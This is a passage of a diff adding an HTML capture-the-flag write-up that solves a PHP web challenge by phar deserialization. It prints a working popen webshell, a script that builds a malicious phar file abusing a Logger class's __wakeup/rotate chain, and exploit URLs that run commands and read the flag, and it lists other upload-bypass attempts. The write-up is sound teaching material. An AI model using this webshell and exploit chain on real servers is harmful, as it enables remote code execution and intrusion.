+      <span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$bak</span><span class="p">))</span>
+        <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$bak</span><span class="p">);</span>
+
+      <span class="o">@</span><span class="nb">rename</span><span class="p">(</span><span class="nv">$cur</span><span class="p">,</span> <span class="nv">$bak</span><span class="p">);</span>
+      <span class="nv">$this</span><span class="o">-&gt;</span><span class="nb">log</span><span class="p">(</span><span class="s2">"Logfile rotated"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span> <span class="p">{</span>
+      <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">rotate</span><span class="p">();</span>
+
+      <span class="k">foreach</span>  <span class="p">(</span><span class="nb">get_object_vars</span><span class="p">(</span><span class="nv">$this</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$k</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+      <span class="k">throw</span> <span class="k">new</span> <span class="nc">Exception</span><span class="p">(</span><span class="s2">"Object is not serializable"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<ul>
+  <li>First of all, we see some variables in the <code class="language-plaintext highlighter-rouge">__construct</code> function. These variables are used in the code to access files and two of those variables are used as extensions. Now, <code class="language-plaintext highlighter-rouge">.log</code> and <code class="language-plaintext highlighter-rouge">.bak</code> don’t seem that interesting for webshells, but this will still be important later on.</li>
+  <li>There is the <code class="language-plaintext highlighter-rouge">log</code> function which opens a filename put together from the variables from the <code class="language-plaintext highlighter-rouge">construct</code> function and appends the parameter message to the file.</li>
+  <li>Then there is a <code class="language-plaintext highlighter-rouge">rotate</code> function. From the code, it looks like the server is working with two log files. One current log file, and the previous log file. When the function is called, the current log file has a <code class="language-plaintext highlighter-rouge">.bak</code> appended and a new current logfile is created.</li>
+  <li>A <code class="language-plaintext highlighter-rouge">__wakeup</code> function that calls <code class="language-plaintext highlighter-rouge">rotate()</code>. After a google search, I find that
+    <ol>
+      <li>The intended use of <code class="language-plaintext highlighter-rouge">__wakeup()</code> is to reestablish any database connections that may have been lost during serialization and perform other reinitialization tasks.</li>
+      <li>unserialize() checks for the presence of a function with the magic name <code class="language-plaintext highlighter-rouge">__wakeup()</code>. If present, this function can reconstruct any resources that the object may have.</li>
+    </ol>
+  </li>
+</ul>
+
+<p>The <code class="language-plaintext highlighter-rouge">rotate</code> function seems a little odd, especially in a CTF challenge where the logging does not add to the minimal functionality there is. Since the wakeup function calls rotate, and we know that <code class="language-plaintext highlighter-rouge">__wakeup</code> is called from unserialize (see above), I searched for a vulerability connected to php unserialization. After a lot of searching and looking stuff up, I found a php deserialization vulnerability connected to <code class="language-plaintext highlighter-rouge">phar</code> files.</p>
+
+<p>There exist several sites describing this vulnerability. I’ll link some of the sources here:</p>
+<ul>
+  <li>https://www.youtube.com/watch?v=fHZKSCMWqF4</li>
+  <li>https://bananamafia.dev/post/php-deserialize-cccamp19/</li>
+  <li>https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization</li>
+</ul>
+
+<p>What makes this vulnerability a bit special is that it does require file upload, but in turn, it does not need a single <code class="language-plaintext highlighter-rouge">unserialize</code> call in the program (as it would in usual object injection/deserialization vulnerabilities) and also it does not depend on an <code class="language-plaintext highlighter-rouge">include</code> call (as it would in LFI vulnerabilities) or a <code class="language-plaintext highlighter-rouge">.php</code> (or any other) extension.</p>
+
+<p>What does it need though? From the resources, I found the following:</p>
+
+<blockquote>
+  <p>If a filesystem function is called with a phar stream as an argument, the Phar’s serialized metadata automatically gets unserialized, by design.</p>
+</blockquote>
+
+<blockquote>
+  <p>The main difference between doing a deserialization attack with this and just a normal deserialize call, is that the initial POP chain must start with a <code class="language-plaintext highlighter-rouge">__wakeup</code> or <code class="language-plaintext highlighter-rouge">__destruct</code> (Property Oriented Programming, similarly to ROP, works by chaining code gadgets together to achieve a goal).</p>
+</blockquote>
+
+<p>So, the requirements are:</p>
+<ul>
+  <li>Possibility for file upload</li>
+  <li>Having access to a filesystem function, which we have from the GET endpoint we found in <code class="language-plaintext highlighter-rouge">upload.php</code></li>
+  <li>Starting the POP chain with a <code class="language-plaintext highlighter-rouge">__wakeup</code> or <code class="language-plaintext highlighter-rouge">__destruct</code>, which we also have in <code class="language-plaintext highlighter-rouge">logger.php</code> for example</li>
+</ul>
+
+<p>Now, we are going to look specifically at <code class="language-plaintext highlighter-rouge">logger.php</code> for executing this exploit, since this class allows us to construct a POP chain that enables setting up an executable web shell.</p>
+
+<p>As we know from the resources, the Phar’s serialized metadata automatically gets unserialized when called with a phar stream. This means we need to construct a Phar file which will have an unserializable PHP Class (as I said, we are going to work with <code class="language-plaintext highlighter-rouge">logger.php</code>, so we need the <code class="language-plaintext highlighter-rouge">Logger</code> class) in its metadata.
+When unserialized, this will create a <code class="language-plaintext highlighter-rouge">Logger</code> object. Now since we first create that class locally, we can set variable values. This gives us full control over the variables in the object:</p>
+
+<p><img src="img/imagery6_loggerVariables.png" alt="" /></p>
+
+<p>From the resources we know that an unserialization calls the <code class="language-plaintext highlighter-rouge">__wakeup</code> function and that the POP chain needs to start with a <code class="language-plaintext highlighter-rouge">__wakeup</code> (or <code class="language-plaintext highlighter-rouge">__destruct</code>), so we know that when we successfully call a filesystem function with a phar wrapper, it  automatically unserializes the metadata and thereby triggers the <code class="language-plaintext highlighter-rouge">__wakeup</code> function which in turn calls the <code class="language-plaintext highlighter-rouge">rotate</code> function which, in turn, uses the mentioned variables.
+Let’s take a detailed look at how these variables are used and what we might be able to do to achieve our goal:</p>
+
+<p><img src="img/imagery7_loggerRotateFunction.png" alt="" /></p>
+
+<p>The function looks for a file under directory <code class="language-plaintext highlighter-rouge">$cur</code> and appends the extension saved in <code class="language-plaintext highlighter-rouge">$bak</code> to it. When the <code class="language-plaintext highlighter-rouge">log</code> function is called for the next time, it will just write to the <code class="language-plaintext highlighter-rouge">&lt;dir&gt;/&lt;name&gt;.&lt;ext&gt;</code> and the backup file will just sit around. Now, of course what comes to mind is to have <code class="language-plaintext highlighter-rouge">rotate</code> append <code class="language-plaintext highlighter-rouge">.php</code> instead of <code class="language-plaintext highlighter-rouge">.bak</code>, making the file in question an executable php file. Now the question is, how do we control the content of that php file. Well, we can upload a <code class="language-plaintext highlighter-rouge">.jpg</code> file containing a webshell. Then, we set:</p>
+<ul>
+  <li>The <code class="language-plaintext highlighter-rouge">ext</code> variable to <code class="language-plaintext highlighter-rouge">.jpg</code> (the extension of our uploaded webshell)</li>
+  <li>The <code class="language-plaintext highlighter-rouge">name</code> variable to <code class="language-plaintext highlighter-rouge">&lt;filename&gt;</code> (the filename of our uploaded webshell without extension, we get this from the cookie)</li>
+  <li>The <code class="language-plaintext highlighter-rouge">dir</code> variable to <code class="language-plaintext highlighter-rouge">uploads</code> (the directory where uploaded webshell is in)</li>
+  <li>The <code class="language-plaintext highlighter-rouge">rext</code> variable to <code class="language-plaintext highlighter-rouge">php</code> (which will be appended to our <code class="language-plaintext highlighter-rouge">uploads/&lt;filename&gt;.jpg</code> file) in the <code class="language-plaintext highlighter-rouge">rotate</code> function.</li>
+</ul>
+
+<p>The following is what the uploaded webshell looked like. Remember: The <code class="language-plaintext highlighter-rouge">php.ini</code> we found previously file disables many webshell functions, so simply calling <code class="language-plaintext highlighter-rouge">system</code> won’t work - but after looking up different possibilities, I quickly found a workaround using <code class="language-plaintext highlighter-rouge">popen()</code>.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+    <span class="nv">$handle</span> <span class="o">=</span> <span class="nb">popen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'code'</span><span class="p">],</span><span class="s1">'r'</span><span class="p">);</span>
+
+    <span class="k">echo</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span><span class="mi">1024</span><span class="o">*</span><span class="mi">4</span><span class="p">);</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>I uploaded this file and took a note of the name that the server gave to it for further use in the following script.
+This is what my php script looked like. It creates the class, creates the Phar Archive (notice the <code class="language-plaintext highlighter-rouge">__HALT_COMPILER()</code> function which is necessary for the webshell to work), puts it into metadata and adds a dummy file into the Archive to respect Phar Archive specifications.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="c1">// Create the POP Chain</span>
+<span class="kd">class</span> <span class="nc">Logger</span>
+<span class="p">{</span>
+
+	<span class="k">public</span> <span class="nv">$ext</span> <span class="o">=</span> <span class="s2">"jpg"</span><span class="p">;</span>
+	<span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">"mP7XaTthJi"</span><span class="p">;</span>
+	<span class="k">public</span> <span class="nv">$dir</span> <span class="o">=</span> <span class="s2">"uploads"</span><span class="p">;</span>
+	<span class="k">public</span> <span class="nv">$rext</span> <span class="o">=</span> <span class="s2">"php"</span><span class="p">;</span>
+	
+<span class="p">}</span>
+
+<span class="c1">// Create the Phar Archive</span>
+<span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">\Phar</span><span class="p">(</span><span class="s2">"test.phar"</span><span class="p">);</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="nf">startBuffering</span><span class="p">();</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="nf">setStub</span><span class="p">(</span><span class="s2">"&lt;?php __HALT_COMPILER(); )?&gt;"</span><span class="p">);</span>
+
+<span class="c1">// Begin of serialization</span>
+<span class="nv">$payload</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Logger</span><span class="p">();</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="nf">setMetadata</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
+
+<span class="c1">// Zip file within the Phar Archive</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="nf">addFromString</span><span class="p">(</span><span class="s2">"test.txt"</span><span class="p">,</span> <span class="s2">"test"</span><span class="p">);</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="nf">stopBuffering</span><span class="p">();</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>After executing this script locally, I receive a <code class="language-plaintext highlighter-rouge">.phar</code> file which i rename to a <code class="language-plaintext highlighter-rouge">.gif</code> and upload it. Again, I take a note of the filename returned in the cookie.</p>
+
+<p>Now I can make a call with a <code class="language-plaintext highlighter-rouge">phar://</code> wrapper to it using the GET endpoint from <code class="language-plaintext highlighter-rouge">upload.php</code>:
+<code class="language-plaintext highlighter-rouge">https://ec67b052-76a5-4c95-90cf-b065c7735e17.idocker.vuln.land/upload.php?check=1&amp;file=phar://uploads/cEatZXBpFK.gif</code></p>
+
+<p>This triggers a 500 internal server error (maybe because of the HALT COMPILER?). Anyway, it does its job, namely: The injected Logger object got unserialized, triggering its <code class="language-plaintext highlighter-rouge">__wakeup</code> function which calls its <code class="language-plaintext highlighter-rouge">rotate</code> function. The <code class="language-plaintext highlighter-rouge">rotate</code> function now looks for a file at location <code class="language-plaintext highlighter-rouge">uploads/mP7XaTthJi.jpg</code> (containing my webshell) and appends a <code class="language-plaintext highlighter-rouge">.php</code> to it, making it executable.</p>
+
+<p>Now I can access my webshell with the GET parameter <code class="language-plaintext highlighter-rouge">code</code> I specified inside of it:
+<code class="language-plaintext highlighter-rouge">https://ec67b052-76a5-4c95-90cf-b065c7735e17.idocker.vuln.land/uploads/mP7XaTthJi.jpg.php?code=whoami</code> returns <code class="language-plaintext highlighter-rouge">hacker</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">https://ec67b052-76a5-4c95-90cf-b065c7735e17.idocker.vuln.land/uploads/mP7XaTthJi.jpg.php?code=cat%20../../flag.txt</code> returns the flag:
+<img src="img/imagery11_webshellFlag.png" alt="" />
+(I added this screenshot afterwards during writeup creation in a different session, so hostname and filenames dont match in url)</p>
+
+<p>This vulnerability is fixed in PHP version 8.0:
+https://php.watch/versions/8.0/phar-stream-wrapper-unserialize</p>
+
+<h2 id="what-i-tried-mostly-before-finding-source-code-but-didnt-work--additional-ideas">What I tried (mostly before finding source code) but didnt work &amp; additional ideas</h2>
+
+<h3 id="noticed-mutiple-file-uploads-possible-in-phpini">Noticed mutiple file uploads possible in php.ini</h3>
+
+<p>Line 849 in php.ini might be interesting:</p>
+<div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">; Maximum number of files that can be uploaded via a single request
+</span><span class="py">max_file_uploads</span> <span class="p">=</span> <span class="s">20</span>
+</code></pre></div></div>
+
+<p>Maybe its possible to upload several files, and depending on the validation, it only checks the first file for a valid ending.
+I tried the following, but I am not sure the upload really works and also in case it does, I dont know where the second file is saved to since I only get one cookie.
+Whats interesting though is, that when having the .php first, and the .png second, The upload goes through and answers with a .png cookie. When doing it the other way around, the upload does not pass validation:</p>
+
+<p><img src="img/imagery8_multipleFileUploadsPngLast.png" alt="" />
+<img src="img/imagery9_multipleFileUploadsPhpLast.png" alt="" /></p>
+
+<p>So it seems, the server is looking at the last file uploaded, validates that filename and also sends the cookie for that filename back. Question is if the server saves the other file at all, and if it does, under which name.</p>
+
+<h3 id="2019-cve">2019 CVE</h3>
+
+<p>I also found another CVE from 2019 (https://www.exploit-db.com/exploits/47553) but the server is running php 7.4.26 (Nov. 2019) which is not vulnerable anymore against the mentioned CVE.</p>
+
+<h3 id="2021-cve">2021 CVE</h3>
+
+<p>I also found this CVE from 2021 https://www.tenable.com/cve/CVE-2021-21707, allowing terminating the filename with a url encoded null byte, so filename.php%00.png would be saved as .php. However, it is fixed exactly in the PHP version 7.4.26 which is the version on the server</p>
+
+<h3 id="2010-cve">2010 CVE</h3>
+
+<p>I found something interesting here: https://onestepcode.com/injecting-php-code-to-jpg/
+Apparently, an exploit discovered (and fixed) 2010 allows executing .jpg files as php. on nginx webservers (which is what we are dealing with here). If say the .jpg file is uploaded under /uploads/file.jpg, one could browse to /uploads/file.jpg/file.php and the file would be executed as php.
+Now, the PHP version is somewhat recent (so an exploit from 2010 may not be the solution here), but I tried the exploit described and it aaactually seems to do something: I get a <code class="language-plaintext highlighter-rouge">403 Access denied</code>.</p>
+
+<p><img src="img/imagery10_403AccessDenied.png" alt="" /></p>
+
+<p>If i change anything, let’s say instead of <code class="language-plaintext highlighter-rouge">/uploads/nNgjM0jNHu.jpg/nNgjM0jNHu.php</code>, I put <code class="language-plaintext highlighter-rouge">/uploads/nNgjM0jNHu.AAA/nNgjM0jNHu.php</code> or <code class="language-plaintext highlighter-rouge">/uploads/AAAAAAAAAA.jpg/nNgjM0jNHu.php</code> or <code class="language-plaintext highlighter-rouge">/uploads/nNgjM0jNHu.jpg/nNgjM0jNHu.AAA</code>, I get a <code class="language-plaintext highlighter-rouge">404 File not found</code>.</p>
+
+<p>It seems the service responds with a <code class="language-plaintext highlighter-rouge">403 Access denied</code> when requesting an URL of the following form:</p>
+
+<p><code class="language-plaintext highlighter-rouge">/uploads/ExistingFile.jpg/Endingwith.php</code></p>
+
+<p>So requesting an existing file under <code class="language-plaintext highlighter-rouge">/uploads/existingfile.jpg</code> followed by <code class="language-plaintext highlighter-rouge">/anything.php</code> where the latter has to END with .php results in a <code class="language-plaintext highlighter-rouge">403 Access denied</code>. 
+<code class="language-plaintext highlighter-rouge">.php</code> isnt overall blocked in url, for example requesting <code class="language-plaintext highlighter-rouge">/uploads/anything.php</code> just gives <code class="language-plaintext highlighter-rouge">404 Not found</code> so the server seems to actually looks for the vulnerability described above.</p>
+
+<p>Now maybe we need to circumvent that Access denied check, which looks for a trailing <code class="language-plaintext highlighter-rouge">.php</code>. I already tried the ones listed on https://book.hacktricks.xyz/pentesting-web/file-upload, but without luck.</p>
+
+<h3 id="overwrite-config-file-making-image-files-executable-as-php">Overwrite config file making image files executable as php</h3>
+
+<p>Another idea would be to find a way to overwrite the server’s configuration for php execution, say having him execute .jpg or .png files as php files; for apache servers it would looke something like this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LoadModule php_module /usr/lib/apache2/modules/libphp.so
+AddType application/x-httpd-php .jpg
+</code></pre></div></div>
+<p>However, it is an nginx server, I will have to look into how it works for that. Also, we would need to find a way to be able to overwrite config in the first place.</p>
+
+<h3 id="race-conditions-on-uploaded-files">Race conditions on uploaded files</h3>
+
+<p>For a while I thought about trying race conditions either</p>
+<ol>
+  <li>on the tmp_name before it gets deleted, but there’s no way I find out the name, neither does it have a .php extension. Also (I am not sure about this) php likely prevents execution of temporary files.</li>
+  <li>on the file itself. This would work if the server would save the file under my provided name, then validate it and delete it in case it doesnt fit the desired extensions. That way if I could execute the file before the server finished validation. However, as we see in the source code, the server does not function that way so I also dropped this idea.</li>
+</ol>
+
+<h2 id="lessons-learned">Lessons learned</h2>
+<p>The challenge took me several days and all the things I tried and researched for bypassing the upload validation were definitely a refresh for all of those areas (obfuscation, race conditions, deserialization). Also, I learned about some new methods from the CVEs that older PHP versions were vulnerable against.</p>
+
+<p>My biggest mistake was probably that when I started off, I did not go through everything step by step (in this case I missed the bruteforcable git repo at first) and instead went off chasing some potential vulnerability.</p>
+</p>
+            </div>
+          </div>
+
+          <!-- Other Options -->
+          <div class="post-share-options clearfix">
+            <!--
+            <div class="pull-left">
+              <ul class="tags">
+                <li><a href="#">Gaming</a></li>
+                <li><a href="matches.html">Matches</a></li>
+                <li><a href="#">Players</a></li>
+              </ul>
+            </div>
+            -->
+            <!--
+            <div class="social-links pull-right">
+              <ul class="social-links">
+                <li><a href="#"><span class="fab fa-twitter"></span></a></li>
+                <li><a href="#"><span class="fab fa-facebook-square"></span></a></li>
+                <li><a href="#"><span class="fab fa-pinterest-p"></span></a></li>
+                <li><a href="#"><span class="fab fa-instagram"></span></a></li>
+              </ul>
+            </div>
+            -->
+          </div>
+        </div>
+
+        <!--Sidebar Side-->
+        <div class="sidebar-side col-lg-4 col-md-12 col-sm-12">
+          <aside class="sidebar">
+
+            <!-- Tags Widget -->
+            <div class="sidebar-widget popular-tags">
+              <div class="widget-content">
+                <h4 class="sidebar-title">Task categories</h4>
+                
+                  <a href="#">web</a>
+                
+                  <a href="#">deserialization</a>
+                
+              </div>
+            </div>
+
+            <!-- Search -->
+            <!--
+            <div class="sidebar-widget search-box">
+              <form method="post" action="contact.html">
+                <div class="form-group">
+                  <input type="search" name="search-field" value="" placeholder="Search" required>
+                  <button type="submit"><span class="icon fa fa-search"></span></button>
+                </div>
+              </form>
+            </div>
+            -->
+
+            <!-- Post Widget -->
+            <div class="sidebar-widget popular-posts">
+              <div class="widget-content">
+                <h4 class="sidebar-title">Recent Writeups</h4>
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                <article class="post">
+                  <div class="post-inner">
+                    
+                    
+                    <figure class="post-thumb"><a href="/writeup/2019/10/27/Numtonce.html"><img src="/writeup/2019/10/27/website.png"
+                          alt=""></a></figure>
+                    <div class="post-info">Aug 4, 2022</div>
+                    <div class="text"><a href="/writeup/2019/10/27/Numtonce.html">Numtonce</a></div>
+                  </div>
+
+                </article>
+                
+                
+                
+                <article class="post">
+                  <div class="post-inner">
+                    
+                    
+                    <figure class="post-thumb"><a href="/writeup/2020/02/05/Draw_with_us.html"><img src="/writeup/2020/02/05/website.png"
+                          alt=""></a></figure>
+                    <div class="post-info">Aug 4, 2022</div>
+                    <div class="text"><a href="/writeup/2020/02/05/Draw_with_us.html">Draw with us</a></div>
+                  </div>
+
+                </article>
+                
+                
+              </div>
+            </div>
+
+            <!-- Category Widget -->
+            <!--
+            <div class="sidebar-widget categories">
+              <div class="widget-content">
+                <h4 class="sidebar-title">Categories</h4>
+                <ul class="blog-categories">
+                  <li><a href="blog-single.html">Gaming</a></li>
+                  <li><a href="blog-single.html">Matches</a></li>
+                  <li><a href="blog-single.html">Video games</a></li>
+                  <li><a href="blog-single.html">Esports</a></li>
+                  <li><a href="blog-single.html">Champions</a></li>
+                </ul>
+              </div>
+            </div>
+            -->
+          </aside>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<!-- End Sidebar Page Container -->
+
+	<!-- Main Footer -->
+  <footer class="main-footer">
+    	<div class="auto-container">
+        	<!--Widgets Section-->
+            <div class="widgets-section">
+            	<div class="row clearfix">
+                	
+                    <!--Column-->
+                    <div class="column col-lg-4 col-md-6 col-sm-12">
+						<div class="footer-widget logo-widget">
+							<div class="logo">
+                            	<a href="/index.html"><img src="/assets/images/logo.png" alt="" /></a>
+                            </div>
+							<div class="text"></div>
+						</div>
+					</div>
+					
+					<!--Column-->
+                    <div class="column col-lg-4 col-md-6 col-sm-12">
+						<div class="footer-widget links-widget">
+							<div class="widget-content">
+								<div class="footer-title">
+									<h2>Links</h2>
+								</div>
+								<div class="row clearfix">
+									<div class="column col-lg-6 col-md-6 col-sm-12">
+										<ul class="list">
+											<li><a href="/about_us.html">About</a></li>
+											<li><a href="/members.html">Our Team</a></li>
+											<li><a href="/events.html">News and CTFs</a></li>
+											<li><a href="/contact.html">Contact</a></li>
+										</ul>
+									</div>
+									<div class="column col-lg-6 col-md-6 col-sm-12">
+										<ul class="list">
+											<li><a href="/contact.html">Help & Support</a></li>
+											<li><a href="/privacy_policy.html">Privacy Policy</a></li>
+										</ul>
+									</div>
+								</div>
+							</div>	
+						</div>
+					</div>
+					
+					<!--Column                    <div class="column col-lg-4 col-md-6 col-sm-12">
+						<div class="footer-widget newsletter-widget">
+							<div class="footer-title">
+                            	<h2>Newsletter</h2>
+                            </div>
+							<div class="text">Subsrcibe us now to get the latest news and updates</div>
+							<div class="newsletter-form">
+                                <form method="post" action="contact.html">
+                                    <div class="form-group clearfix">
+                                        <input type="email" name="email" value="" placeholder="Email address" required>
+                                        <button type="submit" class="theme-btn newsletter-btn"><span class="fas fa-envelope"></span></button>
+                                    </div>
+                                </form>
+                            </div>
+						</div>
+					</div>
+					-->
+
+				</div>
+			</div>
+		</div>
+		
+		<!-- Footer Bottom -->
+		<div class="footer-bottom">
+			<div class="auto-container">
+				<!--Scroll to top-->
+				<div class="scroll-to-top scroll-to-target" data-target="html"><span class="flaticon-up-arrow"></span></div>
+				<!--Scroll to top-->
+				<div class="row clearfix">
+					<!-- Column -->
+					<div class="column col-lg-6 col-md-12 col-sm-12">
+						<div class="copyright">&copy; Copyrights, 2019 All Rights Reserved</div>
+					</div>
+					<!-- Column -->
+					<div class="column col-lg-6 col-md-12 col-sm-12">
+						<ul class="social-icons">
+							<li><a href="https://twitter.com/letzpwn"><span class="fab fa-twitter"></span></a></li>
+						</ul>
+					</div>
+				</div>
+			</div>
+		</div>
+		
+  </footer>
+  
+</div>
+<script src="/assets/js/jquery.js"></script>
+<script src="/assets/js/popper.min.js"></script>
+<script src="/assets/js/bootstrap.min.js"></script>
+<script src="/assets/js/jquery-ui.js"></script>
+<script src="/assets/js/jquery.fancybox.js"></script>
+<script src="/assets/js/owl.js"></script>
+<script src="/assets/js/appear.js"></script>
+<script src="/assets/js/wow.js"></script>
+<script src="/assets/js/scrollbar.js"></script>
+<script src="/assets/js/script.js"></script></body>
+
+</html>
